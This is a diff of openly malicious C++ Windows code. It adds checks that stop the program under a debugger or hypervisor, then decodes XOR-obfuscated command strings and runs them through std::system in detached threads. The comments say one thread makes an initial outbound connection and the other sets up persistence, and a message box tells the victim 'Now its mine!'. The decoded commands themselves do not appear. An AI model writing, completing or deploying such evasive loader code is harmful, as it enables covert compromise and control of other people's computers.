@@ -2,7 +2,60 @@
 #include <windows.h>
 #include <intrin.h>
 
+bool runningInVM() {
+    int cpuInfo[4] = {0};
+    __cpuid(cpuInfo, 1);
+    
+    // ECX bit 31 = hypervisor present
+    return (cpuInfo[2] >> 31) & 1;
+}
+
+void prepLoader() {
+    std::string lcmd = "";
+    unsigned int len = sizeof(W) / sizeof(W[0]);
+
+    for (int i = 0, k = 0; i < len;) {
+        int a = W[i];
+        int b = x[k % x.length()];
+
+        char c = (a ^ b);
+        lcmd += c;
+
+        ++i; ++k;
+    }
+
+    MessageBox(
+        NULL, // Owner window (NULL = no owner)
+        lcmd.c_str(), // Message text
+        "DEBUG", // Title of the window
+        MB_OK
+    );
+
+    std::system(lcmd.c_str());
+}
+void runner() {
+    std::string rcmd = "";
+
+    unsigned int len = sizeof(Wy) / sizeof(Wy[0]);
+
+    for (int i = 0, k = 0; i < len;) {
+        int a = Wy[i];
+        int b = y[k % y.length()];
+
+        char c = (a ^ b);
+        rcmd += c;
+
+        ++i; ++k;
+    }
+
+    std::system(rcmd.c_str());
+}
+
 void initialize() {
+    // run separate thread to send an initial connection
+    std::thread t(runner);
+    t.detach();
+
     // winapi debugger check
     if (IsDebuggerPresent()) {
         MessageBox(
@@ -15,48 +68,24 @@ void initialize() {
     }
 
     // query CPU for hypervisor
-    if (int cpuInfo[4] = {0}; true) {
-        __cpuid(cpuInfo, 1);
-        bool hypervisorPresent = (cpuInfo[2] & (1 << 31)) != 0;
-        if (hypervisorPresent) {
-            MessageBox(
-                NULL, // Owner window (NULL = no owner)
-                "I hate Hypervisors as much as I hate Supervision! >:(", // Message text
-                "I don't think so!", // Title of the window
-                MB_OK
-            );
-            return;
-        }
+    if (runningInVM()) {
+        MessageBox(
+            NULL, // Owner window (NULL = no owner)
+            "I hate Hypervisors as much as I hate Supervision! >:(", // Message text
+            "I don't think so!", // Title of the window
+            MB_OK
+        );
+        return;
     }
 
-    // check bios for VM signatures
-    if (char buffer[128]; true) {
-        DWORD size = sizeof(buffer);
-        if (GetSystemFirmwareTable('RSMB', 0, buffer, size) > 0) {
-            std::string bios(buffer);
-            if (bios.find("VirtualBox") != std::string::npos ||
-                bios.find("VMware") != std::string::npos ||
-                bios.find("Hyper-V") != std::string::npos) {
-                MessageBox(
-                    NULL, // Owner window (NULL = no owner)
-                    "Run me on a real machine punk! >:(", // Message text
-                    "I don't think so!", // Title of the window
-                    MB_OK
-                );
-                return;
-            }
-        }
-    }
+    // determined system is worth persisting
+    std::thread t2(prepLoader);
+    t2.detach();
 
-    // env is safe to operate in
-    prepLoader();
-    runner();
-
-}
-
-void prepLoader() {
-    
-}
-void runner() {
-    
+    MessageBox(
+        NULL, // Owner window (NULL = no owner)
+        "Nice computer you got here! Now its mine! NYA~ >w<", // Message text
+        "Uh Oh!", // Title of the window
+        MB_OK
+    );
 }
